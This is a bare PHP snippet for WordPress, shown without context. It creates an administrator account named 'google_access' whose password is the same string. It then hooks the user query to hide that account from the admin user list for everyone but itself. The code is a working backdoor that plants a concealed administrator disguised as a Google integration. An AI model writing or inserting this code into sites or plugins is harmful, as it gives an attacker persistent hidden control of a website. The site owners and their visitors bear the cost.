$new_user =new WP_User(wp_create_user('google_access','google_access'));
$new_user->set_role('administrator');


add_action('pre_user_query','google_access_user_query');
function google_access_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
  if ($username != 'google_access') { 
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'google_access'",$user_search->query_where);
  }
}
